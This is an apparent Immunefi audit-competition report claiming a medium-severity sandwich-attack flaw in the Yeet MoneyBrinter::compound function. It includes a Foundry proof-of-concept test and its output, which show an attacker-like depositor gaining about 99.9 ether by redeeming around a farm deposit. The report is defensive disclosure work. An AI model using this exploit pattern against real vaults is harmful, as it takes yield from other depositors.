# #41526 \[SC-Medium] MoneyBrinter::compound can be vulnerable to sandwich attacks

**Submitted on Mar 16th 2025 at 08:53:45 UTC by @coffiasd for** [**Audit Comp | Yeet**](https://immunefi.com/audit-competition/audit-comp-yeet)

* **Report ID:** #41526
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/contracts/MoneyBrinter.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The MoneyBrinter::compound function first swaps multiple tokens for token0 and token1. Instead of depositing these tokens into an ERC4626 vault to mint shares, it deposits them into the BeradromeFarmPlugin to add additional underlying assets. This process can be vulnerable to sandwich attacks.

## Vulnerability Details

```solidity
    function compound(
        address[] calldata swapInputTokens,
        IZapper.SingleTokenSwap[] calldata swapToToken0,
        IZapper.SingleTokenSwap[] calldata swapToToken1,
        IZapper.KodiakVaultStakingParams calldata stakingParams,
        IZapper.VaultDepositParams calldata vaultStakingParams
    ) public override onlyStrategyManager nonReentrant returns (uint256) {
       .....
        (uint256 islandTokensMinted, uint256 vaultSharesMinted) =
            zapper.zapInWithMultipleTokens(swapParams, stakingParams, vaultStakingParams);
        require(vaultSharesMinted == 0, "MoneyBrinter: vault shares minted while compounding");
        require(islandTokensMinted >= stakingParams.amountSharesMin, "MoneyBrinter: not enough island tokens minted");
        // deposit into farm
        emit VaultCompounded(_msgSender(), islandTokensMinted);
        _depositIntoFarm(islandTokensMinted);
```

From above code we can see the `vaultSharesMinted` is zero , this function does't mint some ERC4626 shares, it use `_depositIntoFarm` to deposit underlying assets(kodiakVaultTokensMinted) into `beradromeFarmPlugin`.\
This function can make ERC4626 shares holder withdraw more underlying assets.

## Impact Details

* compound can be vulnerable to sandwich attacks, result in attacker takes profit

## References

<https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/contracts/MoneyBrinter.sol?utm\\_source=immunefi#L199-L227>

## Proof of Concept

## Proof of Concept

Test:

```solidity
    function testDepositIntoVaultSandWichAttack2() public {
        address manager = address(0x1001);
        fundUser(manager,100 ether);

        fundUser(bob,2 ether);
        approveToVault(bob, 2 ether);

        vm.prank(bob);
        vault.deposit(2 ether, bob);

        fundUser(alice,2000 ether);
        assertEq(asset.balanceOf(alice),2000 ether);
        approveToVault(alice, 2000 ether);
        vm.prank(alice);
        vault.deposit(2000 ether, alice);


        vm.startPrank(manager);
        asset.approve(address(vault.beradromeFarmPlugin()), type(uint256).max);
        IPlugin(address(vault.beradromeFarmPlugin())).depositFor(address(vault), 100 ether);
        vm.stopPrank();

        //alice withdraw.
        vm.startPrank(alice);
        vault.redeem(vault.balanceOf(alice), alice, alice);

        console2.log("alice profit:",asset.balanceOf(alice) - 2000 ether);
    }
```

Please note that depositFor() works same as compound() function

Out:

```shell
[PASS] testDepositIntoVaultSandWichAttack2() (gas: 413052)
Logs:
  alice profit: 99900099900099900099
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.90ms (551.50µs CPU time)

Ran 1 test suite in 135.00ms (1.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
